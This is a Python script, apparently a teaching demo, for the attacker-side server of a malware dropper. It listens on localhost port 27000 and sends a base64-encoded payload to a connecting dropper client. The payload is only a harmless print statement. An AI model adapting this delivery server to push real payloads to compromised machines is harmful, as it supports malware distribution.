#!/usr/bin/env python3

""" Implementation of the server that sends some malicious code to its
    dropper client.
"""

import base64
import logging
import socket


class Server:
    """ This class represents a server that stores some malicious payload and sends
    it to the dropper once the connection is established.
    """

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def malicious_code(self):
        """ Malicious payload. In this case just a demonstrative command. """
        return b'print("Hello there")'

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before the session. """
        try:
            self.socket.bind(('localhost', self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')

    def send_malicious_code(self):
        """ Send malware to the client once the connection is established. """
        # Establish a connection with the client.
        connection, address = self.socket.accept()
        with connection:
            print('Connection with dropper established from {}'.format(address))
            # Send data to the client and shut down the server.
            encoded_payload = base64.b64encode(self.malicious_code)
            connection.send(encoded_payload)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    server = Server(27000)
    server.initialize()
    # Send a payload to the dropper client once it establishes a connection.
    server.send_malicious_code()
